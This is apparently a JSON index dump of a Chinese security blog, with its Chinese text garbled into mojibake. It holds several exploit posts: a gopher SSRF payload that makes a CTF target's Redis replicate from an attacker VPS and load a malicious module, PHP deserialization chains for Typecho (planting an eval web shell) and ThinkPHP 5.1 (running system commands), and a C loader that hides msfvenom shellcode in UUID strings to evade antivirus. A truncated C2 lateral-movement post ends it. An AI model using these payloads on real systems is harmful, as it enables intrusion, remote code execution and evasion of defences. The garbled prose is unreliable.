25%30%44%25%30%41%25%32%34%34%25%30%44%25%30%41%73%61%76%65%25%30%44%25%30%41 å†™å…¥æˆåŠŸï¼Œå¾—åˆ°flag ä¸»ä»å¤åˆ¶rceåœ¨dockerç¯å¢ƒä¸‹ï¼Œä¸€ä¸ªå•ä¸€çš„å®¹å™¨ä¸­ä¸ä¼šæœ‰é™¤redisä»¥å¤–çš„ä»»ä½•æœåŠ¡å­˜åœ¨ï¼Œå¦‚sshå’Œcrontabï¼Œå†åŠ ä¸Šæƒé™çš„ä¸¥æ ¼æ§åˆ¶ï¼Œåªé å†™æ–‡ä»¶å°±å¾ˆéš¾å†getshelläº†ï¼Œåœ¨è¿™ç§æƒ…å†µä¸‹å¯ä»¥åˆ©ç”¨ä¸»ä»å¤åˆ¶æ‰§è¡Œå‘½ä»¤ã€‚ ä¸»ä»å¤åˆ¶æ¦‚å¿µ ä¸»ä»å¤åˆ¶ï¼Œæ˜¯æŒ‡å°†ä¸€å°RedisæœåŠ¡å™¨çš„æ•°æ®ï¼Œå¤åˆ¶åˆ°å…¶ä»–çš„RedisæœåŠ¡å™¨ã€‚å‰è€…ç§°ä¸ºä¸»èŠ‚ç‚¹(master)ï¼Œåè€…ç§°ä¸ºä»èŠ‚ç‚¹(slave)ï¼›æ•°æ®çš„å¤åˆ¶æ˜¯å•å‘çš„ï¼Œåªèƒ½ç”±ä¸»èŠ‚ç‚¹åˆ°ä»èŠ‚ç‚¹ã€‚å»ºç«‹ä¸»ä»å…³ç³»åªéœ€è¦åœ¨ä»èŠ‚ç‚¹æ“ä½œå°±è¡Œäº†ï¼Œä¸»èŠ‚ç‚¹ä¸ç”¨ä»»ä½•æ“ä½œã€‚ ä¸»ä»å¤åˆ¶ä½œç”¨ Redisæ˜¯ä¸€ä¸ªä½¿ç”¨ANSI Cç¼–å†™çš„å¼€æºã€æ”¯æŒç½‘ç»œã€åŸºäºå†…å­˜ã€å¯é€‰æŒä¹…æ€§çš„é”®å€¼å¯¹å­˜å‚¨æ•°æ®åº“ã€‚ä½†å¦‚æœå½“æŠŠæ•°æ®å­˜å‚¨åœ¨å•ä¸ªRedisçš„å®ä¾‹ä¸­ï¼Œå½“è¯»å†™ä½“é‡æ¯”è¾ƒå¤§çš„æ—¶å€™ï¼ŒæœåŠ¡ç«¯å°±å¾ˆéš¾æ‰¿å—ã€‚ä¸ºäº†åº”å¯¹è¿™ç§æƒ…å†µï¼ŒRediså°±æä¾›äº†ä¸»ä»æ¨¡å¼ï¼Œä¸»ä»æ¨¡å¼å°±æ˜¯æŒ‡ä½¿ç”¨ä¸€ä¸ªrediså®ä¾‹ä½œä¸ºä¸»æœºï¼Œå…¶ä»–å®ä¾‹éƒ½ä½œä¸ºå¤‡ä»½æœºï¼Œå…¶ä¸­ä¸»æœºå’Œä»æœºæ•°æ®ç›¸åŒï¼Œè€Œä»æœºåªè´Ÿè´£è¯»ï¼Œä¸»æœºåªè´Ÿè´£å†™ï¼Œé€šè¿‡è¯»å†™åˆ†ç¦»å¯ä»¥å¤§å¹…åº¦å‡è½»æµé‡çš„å‹åŠ›ï¼Œç®—æ˜¯ä¸€ç§é€šè¿‡ç‰ºç‰²ç©ºé—´æ¥æ¢å–æ•ˆç‡çš„ç¼“è§£æ–¹å¼ã€‚ åˆ©ç”¨è¿˜æ˜¯ä»¥[ç½‘é¼æ¯ 2020 ç„æ­¦ç»„]SSRFMeä¸ºä¾‹ éœ€è¦å…ˆä¸‹è½½ä¸¤ä¸ªå·¥å…· https://github.com/xmsec/redis-ssrf https://github.com/n0b0dyCN/redis-rogue-server å®é™…ç”¨åˆ°çš„åªæœ‰ç¬¬ä¸€ä¸ªé“¾æ¥ä¸­çš„rogue-server.pyå’Œssrf-redis.pyï¼Œè¿˜æœ‰ç¬¬äºŒä¸ªé“¾æ¥ä¸­çš„exp.soï¼ŒæŠŠè¿™ä¸‰ä¸ªæ–‡ä»¶æ”¾åˆ°ä¸€ä¸ªæ–‡ä»¶å¤¹é‡Œå³å¯ ä¿®æ”¹ssrf-redis.pyä¸­çš„ä¸€äº›å‚æ•° lhostæ”¹ä¸ºvpsåœ°å€ï¼Œ6666ç«¯å£ä¸ºrogue-server.pyçš„è¿è¡Œç«¯å£ï¼Œcommandä¸ºè¦æ‰§è¡Œçš„å‘½ä»¤ ipæ”¹ä¸ºç¬¦åˆè¦æ±‚çš„0.0.0.0 å¯†ç æ”¹ä¸ºroot ç”Ÿæˆpayload è¿è¡Œrogue-server.pyï¼Œå»ºç«‹ä»èŠ‚ç‚¹ å°†ç”Ÿæˆçš„payloadè¿›è¡Œurlç¼–ç åè®¿é—®ï¼Œå¾—åˆ°flag 1http://44677c4e-0255-433c-aa69-f1ebedb79c08.node3.buuoj.cn/?url=gopher://0.0.0.0:6379/_%25%32%41%32%25%30%44%25%30%41%25%32%34%34%25%30%44%25%30%41%41%55%54%48%25%30%44%25%30%41%25%32%34%34%25%30%44%25%30%41%72%6f%6f%74%25%30%44%25%30%41%25%32%41%33%25%30%44%25%30%41%25%32%34%37%25%30%44%25%30%41%53%4c%41%56%45%4f%46%25%30%44%25%30%41%25%32%34%31%35%25%30%44%25%30%41%31%31%38%2e%31%39%35%2e%31%36%36%2e%31%33%38%25%30%44%25%30%41%25%32%34%34%25%30%44%25%30%41%36%36%36%36%25%30%44%25%30%41%25%32%41%34%25%30%44%25%30%41%25%32%34%36%25%30%44%25%30%41%43%4f%4e%46%49%47%25%30%44%25%30%41%25%32%34%33%25%30%44%25%30%41%53%45%54%25%30%44%25%30%41%25%32%34%33%25%30%44%25%30%41%64%69%72%25%30%44%25%30%41%25%32%34%35%25%30%44%25%30%41%2f%74%6d%70%2f%25%30%44%25%30%41%25%32%41%34%25%30%44%25%30%41%25%32%34%36%25%30%44%25%30%41%63%6f%6e%66%69%67%25%30%44%25%30%41%25%32%34%33%25%30%44%25%30%41%73%65%74%25%30%44%25%30%41%25%32%34%31%30%25%30%44%25%30%41%64%62%66%69%6c%65%6e%61%6d%65%25%30%44%25%30%41%25%32%34%36%25%30%44%25%30%41%65%78%70%2e%73%6f%25%30%44%25%30%41%25%32%41%33%25%30%44%25%30%41%25%32%34%36%25%30%44%25%30%41%4d%4f%44%55%4c%45%25%30%44%25%30%41%25%32%34%34%25%30%44%25%30%41%4c%4f%41%44%25%30%44%25%30%41%25%32%34%31%31%25%30%44%25%30%41%2f%74%6d%70%2f%65%78%70%2e%73%6f%25%30%44%25%30%41%25%32%41%32%25%30%44%25%30%41%25%32%34%31%31%25%30%44%25%30%41%73%79%73%74%65%6d%2e%65%78%65%63%25%30%44%25%30%41%25%32%34%31%34%25%30%44%25%30%41%63%61%74%25%32%34%25%37%42%49%46%53%25%37%44%2f%66%6c%61%67%25%30%44%25%30%41%25%32%41%31%25%30%44%25%30%41%25%32%34%34%25%30%44%25%30%41%71%75%69%74%25%30%44%25%30%41","link":"/2021/04/26/ssrf%E4%B8%ADgopher-redis%E7%9A%84%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/"},{"title":"typechoååºåˆ—åŒ–åˆ†æ","text":"åˆ†æ1.install.php install.phpä¸­å­˜åœ¨unserializeå‡½æ•°ï¼Œ__typecho_configå¯æ§ã€‚å€¼è¢«ä½œä¸ºå‚æ•°ä¼ å…¥ç±»Typecho_Db 2./var/Typecho/Cookie.php Typecho_Cookie::getæ–¹æ³•ä»Cookieæˆ–è€…æ˜¯POSTæ•°ç»„ä¸­è·å–æ•°æ® 3./var/Typecho/Db.php è·Ÿè¿›ç±»Typecho_Db,ä¼ å…¥çš„å‚æ•°è¢«ä½œä¸ºå­—ç¬¦ä¸²æ‹¼æ¥ï¼Œè§¦å‘__toString()ï¼Œå…¨å±€æœç´¢toString 4./var/Typecho/Feed.phpä¸­å­˜åœ¨å¯åˆ©ç”¨toStringæ–¹æ³• æ»¡è¶³æ¡ä»¶self::RSS2 == $this-&gt;_typeæ‰§è¡Œä¸‹é¢çš„è¯­å¥ï¼Œå¦‚æœ$item[â€˜authorâ€™]æ˜¯ä¸€ä¸ªç±»ï¼Œå°±ä¼šè§¦å‘__get()æ–¹æ³•ï¼Œå¼€å§‹å…¨å±€æœç´¢getæ–¹æ³• 1$content .= '&lt;dc:creator&gt;' . htmlspecialchars($item['author']-&gt;screenName) . '&lt;/dc:creator&gt;' . self::EOL; 5./var/Typecho/request.php request.phpä¸­Typecho_Requestç±»å­˜åœ¨__get()æ–¹æ³•ï¼Œ__get()å«æœ‰ä¸€ä¸ªå‚æ•°ï¼Œå³è¦è·å–çš„æˆå‘˜å±æ€§çš„åç§°ï¼Œ$key=â€™screenNameâ€™ 6.è·Ÿè¿›getæ–¹æ³• 6.è·Ÿè¿›_applyFilteræ–¹æ³•ï¼Œå‘ç°call_user_funcå‡½æ•°ï¼Œåˆ°è¾¾ç»ˆç‚¹ã€‚filterå±æ€§ä¸ºè¦æ‰§è¡Œçš„å‡½æ•°ï¼Œ$valueæ¥æºä¸ºä¼ å…¥å‚æ•°ï¼Œåœ¨getå‡½æ•°ä¸­è¢«$value = $this-&gt;_params[$key]èµ‹å€¼ï¼Œæ¥æºäºå±æ€§_paramsã€‚$this-&gt;_params[$key]ç­‰äº$this-&gt;_params['screenName'] æ„é€ åˆ©ç”¨é“¾ä»¤Typecho_Dbç±»ä¸­çš„$adapterName=$config[â€˜adapterâ€™]ç­‰äºFeed.phpä¸­çš„Typecho_Feedç±»ï¼Œåˆ›å»ºä¸€ä¸ªæ•°ç»„$a=array(â€˜adapterâ€™ =&gt;new Typecho_Feed(),â€™prefixâ€™ =&gt; â€˜typecho_â€™) ä»¤Typecho_Feedç±»ä¸­çš„$item[â€˜authorâ€™]ç­‰äºTypecho_Requestç±» ä»¤Typecho_Requestç±»ä¸­çš„å±æ€§_params=array('screenName'=&gt;'file_put_contents(&quot;shell.php&quot;, &quot;&lt;?php @eval(\\$_POST[\\'a\\']); ?&gt;&quot;)') ä»¤Typecho_Requestç±»ä¸­çš„å±æ€§_filter=array(â€˜assertâ€™) 12345678910111213141516171819202122232425262728293031&lt;?phpclass Typecho_Request{ private $_filter = array(); private $_params = array(); public function __construct(){ $this-&gt;_filter[0] = 'assert'; $this-&gt;_params['screenName'] = 'file_put_contents(&quot;shell.php&quot;, &quot;&lt;?php @eval(\\$_POST[\\'a\\']); ?&gt;&quot;)'; }}class Typecho_Feed{ const RSS2 = 'RSS 2.0'; private $_type; private $_items = array(); public function __construct() { $this-&gt;_type=self::RSS2; $this-&gt;_items[0]=array('author'=&gt;new Typecho_Request()); }}$a=array('adapter' =&gt;new Typecho_Feed(),'prefix' =&gt; 'typecho_');echo urlencode(base64_encode(serialize($a))); åˆ©ç”¨æ¡ä»¶install.phpä¸­è¦æ±‚è§¦å‘ååºåˆ—åŒ–éœ€è¦æ»¡è¶³ä¸¤ä¸ªæ¡ä»¶ å¿…é¡»æœ‰GETå‚æ•°finish Referå¿…é¡»ä¸ºæœ¬ç«™é“¾æ¥ï¼Œå¦‚http://127.0.0.1/typecho åˆ©ç”¨ç»“æœ å†™å…¥æˆåŠŸ","link":"/2021/03/03/typecho%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%86%E6%9E%90/"},{"title":"thinkphp 5.1.x ååºåˆ—åŒ–æ¼æ´åˆ†æ.md","text":"åˆ©ç”¨é“¾11/thinkphp/library/think/process/pipes/Windows.php å­˜åœ¨__destruct()æ–¹æ³• è·Ÿè¿›removeFiles()ï¼Œfile_existsåœ¨å¤„ç†filenameæ—¶ä¼šå½“æˆå­—ç¬¦ä¸²å¤„ç†ï¼Œåªè¦è®©æ„é€ $this-&gt;filesä¸ºåŒ…å«ç±»çš„æ•°ç»„å°±å¯ä»¥è°ƒç”¨__toString() 1/thinkphp/library/think/model/concern/Conversion.php å­˜åœ¨_toString() toJson() è°ƒç”¨toArray() toArray() éœ€è¦è®©$this-&gt;visibleä¸ºç©ºï¼Œ$this-&gt;hiddenä¸ºç©ºï¼Œè°ƒç”¨getAttr()ã€‚$dataç”±$this-&gt;dataå’Œ$this-&gt;mergeåˆå¹¶è€Œæˆã€‚ getAttr()æ»¡è¶³æ¡ä»¶isset($this-&gt;withAttr[$fieldName])å³å¯å‘½ä»¤æ‰§è¡Œï¼Œå‚æ•°å¯æ§ 12$closure = $this-&gt;withAttr[$fieldName];$value = $closure($value, $this-&gt;data); getData()ï¼Œéœ€è¦æ»¡è¶³ç¬¬äºŒä¸ªæ¡ä»¶$this-&gt;dataæ•°ç»„ä¸­å­˜åœ¨$nameé”®ï¼Œå³å¯è¿”å›$this-&gt;data[$name] 1/thinkphp/library/think/Loader.php Loader::parseName parseNameä¼šæŠŠå¤§å†™å­—æ¯è½¬ä¸ºå°å†™å¹¶åœ¨å‰é¢åŠ ä¸Š_ï¼Œå¦‚Aå˜æˆ_aï¼Œä¸å½±å“payloadçš„æ„é€  å‡½æ•°åä¸º$closure = $this-&gt;withAttr[$fieldName];ï¼Œ$fieldNameæ¥æºäºç»è¿‡Loader::parseNameå‡½æ•°å¤„ç†çš„getAttr()å‡½æ•°å‚æ•°$nameï¼Œè€ŒgetAttr()å‡½æ•°å‚æ•°ç­‰äº$dataçš„é”®å$keyï¼Œ$dataç”±$this-&gt;dataå’Œ$this-&gt;mergeåˆå¹¶è€Œæˆã€‚æœ€ç»ˆç­‰äº$this-&gt;withAttr[$key]ã€‚è®©æ•°ç»„$this-&gt;withAtträ¸$this-&gt;dataæœ‰ç›¸åŒçš„é”®åå³å¯ æ‰§è¡Œå‘½ä»¤ï¼š$value=$this-&gt;getData($name),$nameä¸ºgetAttr()å‚æ•°ï¼Œåœ¨getData()å‡½æ•°ä¸­åªè¦æ»¡è¶³array_key_exists($name, $this-&gt;data)å°±ä¼šè¿”å›$this-&gt;data[$name]ï¼Œ$nameä¸ºä¼ å…¥å‚æ•°ç­‰äºé”®å€¼$keyï¼Œæœ€ç»ˆç­‰äº$this-&gt;data[$key]ã€‚ åˆ©ç”¨æ„é€ exp 12345678910111213141516171819202122232425262728293031323334353637383940&lt;?phpnamespace think{ abstract class Model{ private $withAttr = []; private $data = []; public function __construct() { $this-&gt;withAttr=['a'=&gt;'system']; $this-&gt;data=['a'=&gt;'whoami']; } }}namespace think\\model{ use think\\Model; class Pivot extends Model{ }}namespace think\\process\\pipes { use \\think\\Model\\Pivot; use think\\Process; abstract class Pipes { } class Windows extends Pipes { private $files = []; public function __construct() { $this-&gt;files=[new Pivot()]; } } echo urlencode(serialize(new Windows()));}?&gt; åˆ©ç”¨é“¾2å‰é¢çš„è§¦å‘ç‚¹éƒ½ä¸€æ ·ï¼ŒåŒºåˆ«åœ¨toArray()è¿™é‡Œ toArray() è°ƒç”¨_call()æ–¹æ³•ï¼Œé¦–å…ˆéå†æ•°ç»„$this-&gt;appendï¼Œå½“é”®å€¼$nameä¸ºæ•°ç»„æ—¶æ»¡è¶³is_array($name)ã€‚è®©$relationç­‰äºç±»åå³å¯è§¦å‘_call() åœ¨è¿™ä¹‹å‰æŒ‰éœ€è¦æ»¡è¶³3ä¸ªæ¡ä»¶ 123451.$this-&gt;appendä¸ä¸ºç©º2.is_array($name)è®©$this-&gt;appendç­‰äºäºŒç»´æ•°ç»„ï¼Œ$this-&gt;append=[$key-&gt;æ•°ç»„]3.!$relationæ„é€ $this-&gt;append['aaa']å’Œ $this-&gt;relation=['mmm'=&gt;''];å³å¯ getRelation() æ»¡è¶³array_key_exists($name, $this-&gt;relation)å°±ä¼šè¿”å›$this-&gt;relation[$name]ã€‚$nameå°±æ˜¯$this-&gt;appendæ•°ç»„ä¸­çš„é”®åã€‚éœ€è¦è®©$this-&gt;relation[$name]ç­‰äºç©ºæ‰èƒ½æ»¡è¶³!$relationæ‰§è¡Œä¸‹é¢çš„è¯­å¥ã€‚ getAttr()è¿”å›$valueï¼Œä¹Ÿå°±æ˜¯ç»è¿‡getData()å¤„ç†çš„å‚æ•°$key getData()ï¼Œ$nameå°±æ˜¯$this-&gt;appendæ•°ç»„ä¸­çš„é”®å$keyï¼Œæœ€ç»ˆè¿”å›$this-&gt;data[$name]ï¼Œè®©å®ƒç­‰äºä¸€ä¸ªå­˜åœ¨__call()æ–¹æ³•ä¸”ä¸å­˜åœ¨visable()æ–¹æ³•çš„ç±»å³å¯è°ƒç”¨__call 1thinkphp/library/think/Request.php __call(),ç”±äºarray_unshift()ä¼šä¿®æ”¹å‚æ•°æ•°ç»„ï¼Œé€ æˆæ‰§è¡Œå‘½ä»¤ä¸å¯æ§ï¼Œæ‰€ä»¥æ²¡åŠæ³•ç›´æ¥åˆ©ç”¨è¿™ä¸ªcall_user_func_array,åªèƒ½å¯»æ‰¾æ–°çš„åˆ©ç”¨ç‚¹ filterValue()å‡½æ•°ä¸­å­˜åœ¨call_user_funcï¼Œä½†æ˜¯$valueä¸å¯æ§ï¼Œä¸èƒ½ç›´æ¥åˆ©ç”¨ input()å‡½æ•°ä¸­è°ƒç”¨äº†filterValue()ï¼Œå‚æ•°ä¸å¯æ§ä¸èƒ½ç›´æ¥åˆ©ç”¨ param()å‡½æ•°è°ƒç”¨input()ï¼Œæ‰§è¡Œ$this-&gt;input($this-&gt;param, $name, $default, $filter);ï¼Œå‚æ•°ä»ä¸å¯æ§ã€‚ isAjax()è°ƒç”¨param()ï¼Œå‚æ•°$this-&gt;config['var_ajax']å¯æ§ï¼Œè¿™æ ·param()å‡½æ•°ä¸­çš„$nameå‚æ•°å¯æ§ï¼Œè¿™æ ·input()å‡½æ•°ä¸­çš„$nameå¯æ§ã€‚param()å‡½æ•°å¯ä»¥æ¥æ”¶$_GETæ•°ç»„èµ‹å€¼ç»™$this-&gt;paramï¼Œè¿™æ ·input()å‡½æ•°çš„å‰ä¸¤ä¸ªå‚æ•°$this-&gt;paramå’Œ$nameéƒ½å¯æ§äº† å›åˆ°input()å‡½æ•°ï¼Œä¼ å…¥filterValue()å‡½æ•°çš„ç¬¬ä¸€ä¸ªå‚æ•°$dataå’Œç¬¬ä¸‰ä¸ª$filteræ˜¯æ‰§è¡Œå‘½ä»¤çš„å…³é”®ã€‚$dataç­‰äº$this-&gt;getData($data,$name)ï¼Œä¸¤ä¸ªå‡½æ•°å‚æ•°å°±æ˜¯input()ä¼ å…¥çš„å‚æ•°$this-&gt;paramå’Œ$nameã€‚è€Œ$filterç­‰äº$this-&gt;getFilter($filter, $default); getData(),æœ€ç»ˆ$data = $data[$val] = $data[$name]ï¼Œä¹Ÿå°±æ˜¯$this-&gt;param[$this-&gt;config['var_ajax']] getFilter()ï¼Œ$filteræ¥æºäº$this-&gt;filter åˆ©ç”¨æ„é€ exp 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778&lt;?phpnamespace think{ class Request{ protected $hook = []; protected $config = [ // è¡¨å•è¯·æ±‚ç±»å‹ä¼ªè£…å˜é‡ 'var_method' =&gt; '_method', // è¡¨å•ajaxä¼ªè£…å˜é‡ 'var_ajax' =&gt; '_ajax', // è¡¨å•pjaxä¼ªè£…å˜é‡ 'var_pjax' =&gt; '_pjax', // PATHINFOå˜é‡å ç”¨äºå…¼å®¹æ¨¡å¼ 'var_pathinfo' =&gt; 's', // å…¼å®¹PATH_INFOè·å– 'pathinfo_fetch' =&gt; ['ORIG_PATH_INFO', 'REDIRECT_PATH_INFO', 'REDIRECT_URL'], // é»˜è®¤å…¨å±€è¿‡æ»¤æ–¹æ³• ç”¨é€—å·åˆ†éš”å¤šä¸ª 'default_filter' =&gt; '', // åŸŸåæ ¹ï¼Œå¦‚thinkphp.cn 'url_domain_root' =&gt; '', // HTTPSä»£ç†æ ‡è¯† 'https_agent_name' =&gt; '', // IPä»£ç†è·å–æ ‡è¯† 'http_agent_ip' =&gt; 'HTTP_X_REAL_IP', // URLä¼ªé™æ€åç¼€ 'url_html_suffix' =&gt; 'html', ]; protected $param = []; protected $filter; public function __construct() { $this-&gt;hook=['visible'=&gt;[$this,'isAjax']]; $this-&gt;config['var_ajax']='payload'; $this-&gt;param=['payload'=&gt;'whoami']; $this-&gt;filter=['system']; } } abstract class Model{ protected $append = []; private $relation = []; private $data = []; public function __construct() { $this-&gt;append=['mmm'=&gt;[]]; $this-&gt;data=['mmm'=&gt;new Request()];//ç­‰äºnew Request $this-&gt;relation=['mmm'=&gt;'']; } }}namespace think\\model{use think\\Model; class Pivot extends Model{ }}namespace think\\process\\pipes{ use think\\model\\Pivot; //use think\\Process; class Windows { private $files = []; public function __construct() { $this-&gt;files=[new Pivot()]; } } echo urlencode(serialize(new Windows()));}?&gt;","link":"/2021/04/15/thinkphp-5-1-x-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-md/"},{"title":"uuidå…æ€","text":"åŸç†åˆ†æUUIDé€šç”¨å”¯ä¸€æ ‡è¯†ç¬¦ï¼ˆuniversally unique identifier, UUIDï¼‰æ˜¯ä¸€ä¸ª128ä½çš„ç”¨äºåœ¨è®¡ç®—æœºç³»ç»Ÿä¸­ä»¥è¯†åˆ«ä¿¡æ¯çš„æ•°ç›®ã€‚åœ¨Windowsä¸­ä¹Ÿæœ‰ä½¿ç”¨GUIDæ¥æ ‡è¯†å”¯ä¸€å¯¹è±¡ å°†shellcodeè½¬æ¢ä¸ºuuidç”¨msfç”Ÿæˆshellcode 1msfvenom -p windows/x64/exec CMD=&quot;calc.exe&quot; -f c 16ä¸ªå­—èŠ‚è½¬æ¢ä¸ºä¸€ä¸ªuuidå€¼ï¼Œä¸æ»¡æ—¶ç”¨\\x00å¡«å……ï¼Œ\\x00å ä¸€ä¸ªå­—èŠ‚ é¦–å…ˆç”¨pythonæŠŠshellcodeè½¬æ¢ä¸ºuuid 1uuid.UUID(bytes_le=u) uuidè½¬æ¢ä¸ºå­—èŠ‚ 1uuid.UUID('1f748bef-481c-fe01-8b34-ae4801f799ff').bytes_le å°†shellcodeè½¬æ¢ä¸ºuuidï¼Œä¸è¶³åå…­ä¸ªå­—èŠ‚çš„ç”¨\\x00è¡¥å…¨ 12345678910111213import uuidshellcode=b'\\xfc\\x48\\x83\\xe4\\xf0\\xe8\\xc0\\x00\\x00\\x00\\x41\\x51\\x41\\x50\\x52\\x51\\x56\\x48\\x31\\xd2\\x65\\x48\\x8b\\x52\\x60\\x48\\x8b\\x52\\x18\\x48\\x8b\\x52\\x20\\x48\\x8b\\x72\\x50\\x48\\x0f\\xb7\\x4a\\x4a\\x4d\\x31\\xc9\\x48\\x31\\xc0\\xac\\x3c\\x61\\x7c\\x02\\x2c\\x20\\x41\\xc1\\xc9\\x0d\\x41\\x01\\xc1\\xe2\\xed\\x52\\x41\\x51\\x48\\x8b\\x52\\x20\\x8b\\x42\\x3c\\x48\\x01\\xd0\\x8b\\x80\\x88\\x00\\x00\\x00\\x48\\x85\\xc0\\x74\\x67\\x48\\x01\\xd0\\x50\\x8b\\x48\\x18\\x44\\x8b\\x40\\x20\\x49\\x01\\xd0\\xe3\\x56\\x48\\xff\\xc9\\x41\\x8b\\x34\\x88\\x48\\x01\\xd6\\x4d\\x31\\xc9\\x48\\x31\\xc0\\xac\\x41\\xc1\\xc9\\x0d\\x41\\x01\\xc1\\x38\\xe0\\x75\\xf1\\x4c\\x03\\x4c\\x24\\x08\\x45\\x39\\xd1\\x75\\xd8\\x58\\x44\\x8b\\x40\\x24\\x49\\x01\\xd0\\x66\\x41\\x8b\\x0c\\x48\\x44\\x8b\\x40\\x1c\\x49\\x01\\xd0\\x41\\x8b\\x04\\x88\\x48\\x01\\xd0\\x41\\x58\\x41\\x58\\x5e\\x59\\x5a\\x41\\x58\\x41\\x59\\x41\\x5a\\x48\\x83\\xec\\x20\\x41\\x52\\xff\\xe0\\x58\\x41\\x59\\x5a\\x48\\x8b\\x12\\xe9\\x57\\xff\\xff\\xff\\x5d\\x48\\xba\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x48\\x8d\\x8d\\x01\\x01\\x00\\x00\\x41\\xba\\x31\\x8b\\x6f\\x87\\xff\\xd5\\xbb\\xf0\\xb5\\xa2\\x56\\x41\\xba\\xa6\\x95\\xbd\\x9d\\xff\\xd5\\x48\\x83\\xc4\\x28\\x3c\\x06\\x7c\\x0a\\x80\\xfb\\xe0\\x75\\x05\\xbb\\x47\\x13\\x72\\x6f\\x6a\\x00\\x59\\x41\\x89\\xda\\xff\\xd5\\x63\\x61\\x6c\\x63\\x2e\\x65\\x78\\x65\\x00'shellcodelist=[]if(len(shellcode)%16!=0): while len(shellcode)%16!=0: shellcode+=b'\\x00'for i in range(len(shellcode)//16): u=str(uuid.UUID(bytes_le=shellcode[i*16:i*16+16])) shellcodelist.append(u)print(shellcodelist) åŠ è½½shellcode 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849#include &lt;Windows.h&gt;#include &lt;Rpc.h&gt;#include &lt;iostream&gt;#pragma comment(lib, &quot;Rpcrt4.lib&quot;)const char* uuids[] ={&quot;e48348fc-e8f0-00c0-0000-415141505251&quot;,&quot;d2314856-4865-528b-6048-8b5218488b52&quot;,&quot;728b4820-4850-b70f-4a4a-4d31c94831c0&quot;,&quot;7c613cac-2c02-4120-c1c9-0d4101c1e2ed&quot;,&quot;48514152-528b-8b20-423c-4801d08b8088&quot;,&quot;48000000-c085-6774-4801-d0508b481844&quot;,&quot;4920408b-d001-56e3-48ff-c9418b348848&quot;,&quot;314dd601-48c9-c031-ac41-c1c90d4101c1&quot;,&quot;f175e038-034c-244c-0845-39d175d85844&quot;,&quot;4924408b-d001-4166-8b0c-48448b401c49&quot;,&quot;8b41d001-8804-0148-d041-5841585e595a&quot;,&quot;59415841-5a41-8348-ec20-4152ffe05841&quot;,&quot;8b485a59-e912-ff57-ffff-5d48ba010000&quot;,&quot;00000000-4800-8d8d-0101-000041ba318b&quot;,&quot;d5ff876f-f0bb-a2b5-5641-baa695bd9dff&quot;,&quot;c48348d5-3c28-7c06-0a80-fbe07505bb47&quot;,&quot;6a6f7213-5900-8941-daff-d563616c632e&quot;,&quot;00657865-0000-0000-0000-000000000000&quot;,};int main(){ HANDLE hc = HeapCreate(HEAP_CREATE_ENABLE_EXECUTE, 0, 0); void* ha = HeapAlloc(hc, 0, 0x100000); //haä¸ºæŒ‡å‘ç”³è¯·å †çš„é¦–åœ°å€çš„æŒ‡é’ˆ DWORD_PTR hptr = (DWORD_PTR)ha; //è®©hptræŒ‡å‘ha int elems = sizeof(uuids) / sizeof(uuids[0]); for (int i = 0; i &lt; elems; i++) { RPC_STATUS status = UuidFromStringA((RPC_CSTR)uuids[i], (UUID*)hptr);//è½¬æ¢åæŒ‡å‘uuidåœ°å€ä¿å­˜åœ¨hptr if (status != RPC_S_OK) { printf(&quot;failed&quot;); CloseHandle(ha); return -1; } hptr += 16; } EnumSystemLocalesA((LOCALE_ENUMPROCA)ha, 0); //æŠŠEnumSystemLocalesAå‚æ•°ä¸­çš„å›è°ƒå‡½æ•°è®¾ç½®ä¸ºæŒ‡å‘shellcodeåœ°å€æŒ‡é’ˆï¼Œæ‰§è¡Œshellcode CloseHandle(ha); return 0;} æ‰§è¡ŒæˆåŠŸ APIå‡½æ•°UuidFromStringAå°†å­—ç¬¦ä¸²å½¢å¼çš„shellcodeè½¬æ¢ä¸ºUUIDï¼ŒæˆåŠŸè¿”å›RPC_S_OKï¼Œå¤±è´¥è¿”å›RPC_S_INVALID_STRING_UUID 1234RPC_STATUS UuidFromStringA( RPC_CSTR StringUuid, //æŒ‡å‘å­—ç¬¦ä¸²çš„æŒ‡é’ˆ UUID *Uuid //ä»¥äºŒè¿›åˆ¶å½¢å¼è¿”å›æŒ‡å‘UUIDçš„æŒ‡é’ˆã€‚ ); EnumSystemLocalesAåŠŸèƒ½ä¸ºæšä¸¾æ“ä½œç³»ç»Ÿä¸Šå®‰è£…æˆ–æ”¯æŒçš„è¯­è¨€ç¯å¢ƒï¼Œç¬¬ä¸€ä¸ªå‚æ•°ä¸ºæŒ‡å‘åº”ç”¨ç¨‹åºå®šä¹‰çš„å›è°ƒå‡½æ•°çš„æŒ‡é’ˆï¼Œå°†å®ƒè®¾ç½®ä¸ºæŒ‡å‘UUIDçš„æŒ‡é’ˆå³å¯æ‰§è¡Œshellcode 1234BOOL EnumSystemLocalesA( LOCALE_ENUMPROCA lpLocaleEnumProc, ///æŒ‡å‘åº”ç”¨ç¨‹åºå®šä¹‰çš„å›è°ƒå‡½æ•°çš„æŒ‡é’ˆ DWORD dwFlags //æŒ‡å®šè¦æšä¸¾çš„è¯­è¨€ç¯å¢ƒæ ‡è¯†ç¬¦çš„æ ‡å¿—);","link":"/2021/02/27/uuid%E5%85%8D%E6%9D%80/"},{"title":"ä¸å‡ºç½‘ä¸»æœºä¸Šçº¿æ–¹æ³•","text":"æµ‹è¯•ç¯å¢ƒå‡è®¾192.168.111.0/24ä¸ºå…¬ç½‘ipæ®µï¼Œ192.168.204.0/24ä¸ºå†…ç½‘ipæ®µ webæœåŠ¡å™¨ Windows 2008 r2DMZä¸»æœº è™šæ‹Ÿæœºä¸¤å—ç½‘å¡ä¸€å—è®¾ç½®ä¸ºNATæ¨¡å¼ï¼Œä¸€å—è®¾ç½®ä¸ºHOSTONLYæ¨¡å¼ï¼Œå¯é€šå¤–ç½‘ å…¬ç½‘ip:192.168.111.132 å†…ç½‘ip:192.168.204.188 å†…ç½‘ä¸»æœº Windows 2012è™šæ‹Ÿæœºç½‘å¡è®¾ç½®HOSTONLYæ¨¡å¼ï¼Œä¸é€šå¤–ç½‘ å†…ç½‘ip:192.168.204.141 C2ï¼š Kali Linuxå…¬ç½‘ipï¼š192.168.111.129 1.SMB beaconâ€‹ SMB 